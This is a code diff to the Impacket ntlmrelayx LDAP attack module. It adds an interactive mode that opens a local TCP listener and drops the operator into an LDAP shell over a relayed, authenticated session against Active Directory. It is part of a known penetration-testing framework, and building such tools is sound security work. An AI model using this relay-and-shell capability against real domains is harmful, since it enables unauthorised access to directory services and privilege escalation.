@@ -29,7 +29,9 @@ from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.utils.conv import escape_filter_chars
 
 from impacket import LOG
+from impacket.examples.ldap_shell import LdapShell
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
+from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.uuid import string_to_bin, bin_to_string
@@ -69,6 +71,9 @@ class LDAPAttack(ProtocolAttack):
     def __init__(self, config, LDAPClient, username):
         self.computerName = '' if config.addcomputer == 'Rand' else config.addcomputer
         ProtocolAttack.__init__(self, config, LDAPClient, username)
+        if self.config.interactive:
+            # Launch locally listening interactive shell.
+            self.tcp_shell = TcpShell()
 
     def addComputer(self, parent, domainDumper):
         """
@@ -501,6 +506,14 @@ class LDAPAttack(ProtocolAttack):
 
         # Create new dumper object
         domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
+
+        if self.tcp_shell is not None:
+            LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
+            # Start listening and launch interactive shell.
+            self.tcp_shell.listen()
+            ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
+            ldap_shell.cmdloop()
+            return
 
         # If specified validate the user's privileges. This might take a while on large domains but will
         # identify the proper containers for escalating via the different techniques.
